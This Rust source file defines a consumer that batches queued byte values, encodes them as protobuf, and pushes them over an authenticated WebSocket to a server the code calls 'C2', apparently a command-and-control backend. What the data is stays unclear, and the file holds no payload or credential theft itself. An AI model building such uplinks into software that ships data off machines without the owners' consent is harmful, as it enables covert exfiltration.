use std::error::Error;
use log::error;
use prost::Message;
use crate::message::Universal;
use crate::clients::ws_client::WebSocketClient;
use crate::system_initializer::data_queue::QUEUE;
use crate::config::configuration::CONFIG;

pub struct Consumer {
    batch_size: usize,
    ws_obj : Option<WebSocketClient>,
    historical_batch: Vec<Vec<u8>>,
}

impl Consumer {
    pub fn new(
        batch_size: usize,
    ) -> Self {
        Consumer {
            batch_size,
            ws_obj:None,
            historical_batch: Vec::new(),
        }
    }

    pub async fn consume(&mut self) -> Result<(), Box<dyn Error>> {
        self.connect_to_c2().await?;
        loop {
            let historical_value = QUEUE.dequeue();
            self.historical_batch.push(historical_value);

            if self.historical_batch.len() >= self.batch_size {
                let universal_buffer = self.process_universal_message(self.historical_batch.clone()).await?;
                if let Some(ws_obj) = &mut self.ws_obj { 
                    match ws_obj.push_to_c2(universal_buffer).await {
                        Ok(_) => {}
                        Err(e) => {
                            error!("Failed to send data to C2: {}", e);
                        }
                    }
                } else {
                    error!("WebSocket client not initialized");
                }
                self.historical_batch.clear();
            }
        }
    }

    async fn process_universal_message(
        &self,
        historical_values: Vec<Vec<u8>>,
    ) -> Result<Vec<u8>, Box<dyn Error>> {
        let universal_data = Universal {
            r#type: vec![7201; historical_values.len()],
            messages: historical_values,
        };

        let mut universal_buffer = Vec::new();
        universal_data.encode(&mut universal_buffer)
            .expect("Failed to encode Universal data");

        Ok(universal_buffer)
    }

    async fn connect_to_c2(&mut self)->Result<(), Box<dyn std::error::Error>>{        
        let backend_url = CONFIG.get_base();
        let header_key = CONFIG.get_header_key();
        let header_value = CONFIG.get_header_value();
        
        let mut  ws_obj = WebSocketClient::new(backend_url.to_string(), header_key, header_value);
        if let Err(e) = ws_obj.connect_to_c2_server().await {
            error!("Failed to connect to C2 server: {}", e);
            return Err(e);
        }
        self.ws_obj = Some(ws_obj);
        Ok(())
    }
}
